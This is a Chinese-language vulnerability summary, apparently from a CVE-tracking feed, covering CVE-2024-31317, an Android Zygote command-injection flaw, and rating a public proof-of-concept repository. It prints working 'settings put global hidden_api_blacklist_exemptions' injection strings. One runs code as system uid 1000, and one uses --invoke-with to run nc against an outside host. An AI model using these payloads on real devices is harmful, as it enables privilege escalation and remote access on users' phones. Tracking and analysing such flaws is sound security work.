## CVE-2024-31317 - Android Zygote Deserialization/Command Injection

**漏洞编号:** CVE-2024-31317

**漏洞类型:** 权限提升 (Elevation of Privilege)

**影响应用:** Android

**危害等级:** 高危，可实现本地权限提升，以任意应用身份执行代码

**影响版本:** Android 12, 12L, 13, 14

**利用条件:** 需要 `WRITE_SECURE_SETTINGS` 权限。通常可通过 ADB 或其他漏洞获取。低版本Android可以直接通过命令注入，高版本需要Bypass方案。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-31317 允许攻击者利用不安全的反序列化或命令注入，在 Zygote 进程中以任意应用身份执行代码。该漏洞存在于 `ZygoteProcess.java` 的多个函数中，攻击者可以通过 `WRITE_SECURE_SETTINGS` 权限设置恶意的 `hidden_api_blacklist_exemptions` 值，从而注入恶意参数。

**利用方式：**

1.  **获取 `WRITE_SECURE_SETTINGS` 权限：** 这是利用该漏洞的前提条件。可以通过 ADB (如果设备已启用 USB 调试) 或利用其他漏洞来获取此权限。
2.  **构造恶意 `hidden_api_blacklist_exemptions` 值：** 攻击者需要构造包含恶意命令的字符串，并使用 `settings put global hidden_api_blacklist_exemptions` 命令将其写入系统设置。
3.  **触发 Zygote 进程：**  写入设置后，当系统尝试使用被篡改的 `hidden_api_blacklist_exemptions` 时，Zygote 进程会执行注入的恶意命令。

**低版本 (Android 11 及以下) 利用：**
可以直接通过换行符进行命令注入。
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n8\n--runtime-args\n--setuid=1000\n--setgid=1000\n--nice-name=com.android.settings\n--app-data-dir=/data/user/0/com.android.settings\n--package-name=com.android.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\nandroid.app.ActivityThread"
```
可以使用`invoke-with`参数执行命令，但需要开启 debug 模式，可以通过`runtime-flags`参数设置所有debug属性。
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n7\n--runtime-args\n--setuid=1000\n--setgid=1000\n--runtime-flags=43267\n--invoke-with\nnc 192.168.0.112 9981;\n--seinfo=platform:system_app:targetSdkVersion=29:complete"
```

**高版本 (Android 12 及以上) 利用：**
由于 Google 在 Android 12 中引入了 C++ 命令解析器，简单的命令注入不再有效。需要使用更复杂的绕过方法，例如，在注入的恶意命令之前填充大量逗号以增加时间间隔，从而绕过 `NativeCommandBuffer` 的限制。

**有效性评估：**
根据提供的漏洞信息和利用代码，该漏洞的 PoC 代码应该是有效的。多个搜索引擎结果都提到了该漏洞的利用，并提供了相关的分析和参考链接。提供的利用代码也包含了低版本和高版本的利用方法，并给出了详细的步骤和示例。

**投毒风险评估：**
该仓库主要包含漏洞利用的说明文档和一些构建文件。虽然无法完全排除投毒的可能性，但从目前的代码来看，风险较低。风险点可能存在于利用脚本中，例如执行 nc 命令，虽然是一个正常的网络工具，但是存在被利用的风险，例如连接到恶意的服务器。gradle文件风险较小，主要是构建配置，但理论上存在远程依赖引入恶意代码的可能性。综合评估，投毒风险约为 10%。

**项目地址:** [fuhei/CVE-2024-31317](https://github.com/fuhei/CVE-2024-31317)

**漏洞详情:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)